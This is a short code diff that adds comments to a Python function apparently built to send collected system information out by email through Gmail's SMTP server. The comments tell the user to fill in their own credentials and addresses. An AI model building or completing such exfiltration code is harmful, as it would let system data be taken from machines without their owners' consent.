@@ -16,8 +16,8 @@ def send_sys_infs():
     sysdata = file.read()
     obj = smtplib.SMTP('smtp.gmail.com', 587)
     obj.starttls()
-    obj.login('', '')
-    obj.sendmail('', '', sysdata)
+    obj.login('', '') #provide your own mail address and app password
+    obj.sendmail('', '', sysdata) #provide a from and a to address
     obj.quit()
 
 def public_ip_data():
